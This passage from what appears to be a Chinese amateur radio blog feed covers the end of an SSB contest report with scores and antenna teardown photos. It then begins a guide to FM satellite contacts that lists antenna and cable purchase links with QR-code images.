data-caption="IMG_20241027_064850" loading="lazy"></p><p>开干已经是7点30分，没听到几个亚洲之外的信号，直到 9 点钟的时候才有亚洲以外的信号过来，还算比较强劲。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/daBrOFQfixDHKCY.jpg" alt="image-20241211021829292" data-caption="image-20241211021829292" loading="lazy"></p><p>速率还是提不上去，一直在扫地，有了昨天配好的 bandmap 功能扫地扫的更快了，不过有几个台叫不通，拉扯几下就放弃我了，很难受。还有就是担心自己抄收呼号抄错了，有些呼号数据库里面没有，自己抄错了会扣分（但是到最后一个都没错）。</p><p>发现 JA 台听不懂我说的 seven，转而用日文的 なな(nana) 解释，Bravo Hotel number seven, number nana。很有用，解决了很多个听不懂我的英文念法的日本台。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/RO8umgBdJf9Yl4I.jpg" alt="image-20241207015046949" data-caption="image-20241207015046949" loading="lazy"></p><p>回过头来看这张图，扣掉昨天已经通过的台，速率其实提高了很多。</p><p>就这样一直扫地扫地，期间累了利用 7300 的录音功能进行摆摊。找一个空闲频率问了几句有没有人用这个频率，没人回就开始摆摊，平均摆摊 20 分钟上钩一个吧，感觉不如去扫地。</p><p>就这样一直在干 DU, JA, YB, VU, 直到下午 3 点父亲来了，叫我回家，我一看一个小时才通了 5 个台，频率上都是干过的大台了，遂跟着回家，准备第二天早上再来。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/7lGDBNrVzYFp8c9.jpg" alt="IMG_20241027_154713" data-caption="IMG_20241027_154713" loading="lazy"></p><h2 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h2><p>依旧夜间 FT8 挂机，看到开美国了有点激动~</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/uQPFCqazLZonbmT.jpg" alt="IMG_20241028_064550" data-caption="IMG_20241028_064550" loading="lazy"></p><p>6点50分到位，依旧是 DU, YB, JA 等等离得近的台，开始疯狂扫地，最后在7点58分的时候和 JR3NZC 完成最后一个 QSO。</p><p>得分 18038，160个 QSO，终于结束~</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/4w89bxknoFhj7aU.jpg" alt="IMG_20241028_075859" data-caption="IMG_20241028_075859" loading="lazy"></p><h2 id="收尾"><a href="#收尾" class="headerlink" title="收尾"></a>收尾</h2><p>下面是一些收尾工作的照片</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/H6yz85xsMQAq2Tu.jpg" alt="IMG_20241027_155836" data-caption="IMG_20241027_155836" loading="lazy"></p><p>10m 天线这样看的话，体积也是有蛮大的，另外有一根阵子弯折的比较厉害，新买的那根不太行，不知道影响大不大。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/Xuwr4lEZ6TeI8WJ.jpg" alt="IMG_20241027_160434" data-caption="IMG_20241027_160434" loading="lazy"></p><p>巴伦盒子的螺丝经过雨水一天的洗礼就生锈了，后面全换 304 螺丝了。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/q6NjkPBi1st3vKh.jpg" alt="IMG_20241027_162148" data-caption="IMG_20241027_162148" loading="lazy"></p><p>从上往下看</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/tmb5D1YRqMCskjw.jpg" alt="IMG_20241027_162645" data-caption="IMG_20241027_162645" loading="lazy"></p><p>端馈巴伦螺丝也没有幸免。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/iLKtOxwZWdnJFhQ.jpg" alt="IMG_20241027_162645" data-caption="IMG_20241027_162645" loading="lazy"></p><p>拆下来的地钉。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/5dsgvAZ9XHOh71R.jpg" alt="IMG_20241027_160243" data-caption="IMG_20241027_160243" loading="lazy"></p><p>狗窝~</p><h1 id="总结和展望"><a href="#总结和展望" class="headerlink" title="总结和展望"></a>总结和展望</h1><p>其实在比赛还没结束的时候，就有其他的友台发自己的分数了，通过比较发现自己做的 QSO 数太少了，回过头来想了想，我能听见的台 90% 我都通联上了，QSO 数量这么少只有两种可能。传播不好 or 环境因素，看了一下周围，我这属于是山脚下，没有高度，可能这就是最大的原因吧。</p><p>其实最开始比赛是想去客席别人的台和设备，但是想了想算了。这次比赛我尽自己最大的努力，并且也没有出现关键性的错误，比赛顺利完结，一切都顺利，这就是最好的结果了。</p><p>Raw Score 出来了， BY #4，AS #37。成绩断层很大，和上一名差距有点吓人了。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/jCv3TgEK18ysUiq.jpg" alt="image-20241211034817144" data-caption="image-20241211034817144" loading="lazy"></p><p>同时我的 SSB DXCC 也不是个位数了，另外还多了 4 个 SSB 独有的 DXCC。 </p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/qY3mBat2TJfCO8d.jpg" alt="image-20241211035249049" data-caption="image-20241211035249049" loading="lazy"></p><p>下一步的计划是学习 CW，做一个 4 单元的便携快拆八木、入坑猪网天线和学习天线设计。我玩业余无线电的目的不仅仅是通联这件事本身，而是折腾的乐趣。</p><p>感谢看到这里的各位，也同样感谢前辈们的经验分享，没有你们的支持我走不到今天这一步，希望有一天能和你们在空中相遇，也同样祝愿大家能通到更多更远的电台~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;2021 年，我接触了业余无线电。但我的实际活动是从今年也就是 2024 年开始的，年初有幸认识到岳阳本地的友台，BG7HTS 送了一根 U</summary>
      
    
    
    
    <category term="无线电" scheme="https://blog.irec.moe/categories/%E6%97%A0%E7%BA%BF%E7%94%B5/"/>
    
    
    <category term="短波" scheme="https://blog.irec.moe/tags/%E7%9F%AD%E6%B3%A2/"/>
    
    <category term="比赛" scheme="https://blog.irec.moe/tags/%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>如何正确的优雅的完成 FM 卫星通联</title>
    <link href="https://blog.irec.moe/qsoviasat.html"/>
    <id>https://blog.irec.moe/qsoviasat.html</id>
    <published>2024-09-09T04:00:00.000Z</published>
    <updated>2024-10-30T09:28:38.196Z</updated>
    
    <content type="html"><![CDATA[<p>近期在打 ISS 的时候发现挺多的友台入坑了，晚间的 ISS 非常热闹。作为一个入坑 FM 卫星通联 6 个月的无线电爱好者，掌握了一定的通联技巧，所以在此分享一下我的经验。</p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><h2 id="硬件部分"><a href="#硬件部分" class="headerlink" title="硬件部分"></a>硬件部分</h2><p>你需要有一台上了证的电台、一根八木天线，其实其他类型的天线也能上，但是我建议积累一定经验之后再来操作比较好。</p><p>八木天线推荐 JYR 的 U7V4，双极化对于 SO-50 这种卫星很舒服，我的建议是一步到位，虽然天线的价格可以买3个 K6 了，曾经我也是从 U5V3 换过来的，打 SO-50 手拧成麻花了。</p><p>需要一根两头都是M公的馈线，长度 1m - 0.5m 就够了，一个 SMA 母头转 M 母的的转接头。</p><p>为啥不直接用 SMA 到 M 头的馈线？别问，问就是馈线会 QBG。</p><p>辅助设备需要有一个手机支架，我用的是闪魔的骑行支架，可以直接夹在主梁上，他的设计拆装很方便。</p><p>天馈部分所有用到的购买链接都在这里</p><table><thead><tr><th>名称</th><th>SKU</th><th>购买链接</th><th>二维码</th></tr></thead><tbody><tr><td>馈线</td><td>M公头-M公头 1m</td><td><a href="https://item.taobao.com/item.htm?id=628307067506">https://item.taobao.com/item.htm?id=628307067506</a></td><td><img onerror="imgOnError(this);" data-fancybox="gallery" src="data:image/png;base64,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" alt="生成的二维码" data-caption="生成的二维码" loading="lazy"></td></tr><tr><td>天线</td><td>JYR U7V4</td><td><a href="https://item.taobao.com/item.htm?id=6365910487">https://item.taobao.com/item.htm?id=6365910487</a></td><td><img onerror="imgOnError(this);" data-fancybox="gallery" src="data:image/png;base64,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" alt="img" data-caption="img" loading="lazy"></td></tr><tr><td>转接头</td><td>SMA母转M母</td><td><a href="https://item.taobao.com/item.htm?id=616640602871">https://item.taobao.com/item.htm?id=616640602871</a></td><td><img onerror="imgOnError(this);" data-fancybox="gallery" src="data:image/png;base64,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" alt="img" data-caption="img" loading="lazy"></td></tr><tr><td>手机支架</td><td>车把款</td><td><a href="https://item.taobao.com/item.htm?id=787258619047">https://item.taobao.com/item.htm?id=787258619047</a></td><td><img onerror="imgOnError(this);" data-fancybox="gallery" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAZAAAAGQCAIAAAAP3aGbAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAJN0lEQVR4nO3dwZLbOBJAwdaG//+XvYe5QxPglIFHZ94lkWz5BQ6l8uf3798/AAX/O30BAP+WYAEZggVkCBaQIVhAhmABGYIFZAgWkCFYQIZgARmCBWQIFpAhWECGYAEZggVkCBaQIVhAhmABGb+2X/n5fP7D6zhrvSf6yZ1ub6A+8qFD1vfy5Gq3n9LcX3z7Q9f+nn9ua05YQIZgARmCBWQIFpAhWECGYAEZggVkCBaQIVhAxv6k+9ptw9Y/h6aiW6PYa0P3MuTJhw49/KGJ/zf9W/vKCQvIECwgQ7CADMECMgQLyBAsIEOwgAzBAjIEC8iYmnRfu3Bn9pDFJc1NA7ce79zG9z/vTb9PWDv1d3HCAjIEC8gQLCBDsIAMwQIyBAvIECwgQ7CAjDODoy1PJhsXr53b4Ttk+zk8mV28bR/xhR/6V3HCAjIEC8gQLCBDsIAMwQIyBAvIECwgQ7CADMECMky6f/eykfTbHBk6Nwcf5YQFZAgWkCFYQIZgARmCBWQIFpAhWECGYAEZggVknJl0f9NQ79Cm8+1V8XOOXNL2U3rTd+yJlz0HJywgQ7CADMECMgQLyBAsIEOwgAzBAjIEC8gQLCBjatK9tVZ8bWgk/cng+JEP3Za70+3p8At/DPAyTlhAhmABGYIFZAgWkCFYQIZgARmCBWQIFpDxedkG1du0hvpye5kXhkZDn7jwknKcsIAMwQIyBAvIECwgQ7CADMECMgQLyBAsIEOwgIwzk+52+H594dr2JT15gEN/mtbbnjL073Ro+H5upt8JC8gQLCBDsIAMwQIyBAvIECwgQ7CADMECMgQLyPh1+gL+S0PTwENz8HPD1kPj9Wu3jdfPDVsfebxDE/9DHzrHCQvIECwgQ7CADMECMgQLyBAsIEOwgAzBAjIEC8iYmnQ/Mv99ZP/3kaX4Q4ZG0i9crz50p3Mz/dsvvHBa/QknLCBDsIAMwQIyBAvIECwgQ7CADMECMgQLyPi05h6HZjifvO2Fl9Qy9/D//NvOfej2tOqRr8rcJTlhARmCBWQIFpAhWECGYAEZggVkCBaQIVhAhmABGfuT7hfO1669aVfshVtxhxYHb3/oE0d+vTCk9Yi+csICMgQLyBAsIEOwgAzBAjIEC8gQLCBDsIAMwQIyYjvd1y5cr7547YXLtofM3enQTvcLDX2Rct8HJywgQ7CADMECMgQLyBAsIEOwgAzBAjIEC8gQLCDj15FP3R7bHRo6v1DuTrd3ug8Nnc89otum5Ofu5cJ/Mk5YQIZgARmCBWQIFpAhWECGYAEZ